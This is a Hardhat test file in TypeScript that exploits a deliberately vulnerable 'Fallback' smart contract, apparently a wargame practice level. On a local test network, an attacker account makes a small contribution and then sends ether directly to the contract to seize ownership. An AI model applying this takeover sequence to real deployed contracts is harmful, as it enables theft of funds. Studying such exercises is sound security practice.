import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { Fallback } from "../../typechain/Fallback";

describe("FallbackAttack", function () {
  let FallbackToken;
  let store: Fallback;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  beforeEach(async function () {
    FallbackToken = await ethers.getContractFactory("Fallback");
    [owner, attacker] = await ethers.getSigners();
    store = await FallbackToken.connect(owner).deploy();
  });

  describe("attack", function () {
    it("should transfer ownership", async function () {
      await store
        .connect(attacker)
        .contribute({ value: ethers.utils.parseEther("0.00001") });

      await attacker.sendTransaction({
        from: attacker.address,
        to: store.address,
        value: ethers.utils.parseEther("0.00001"),
      });

      const ownerAddress = await store.owner();
      expect(ownerAddress).to.equal(attacker.address);
    });
  });
});
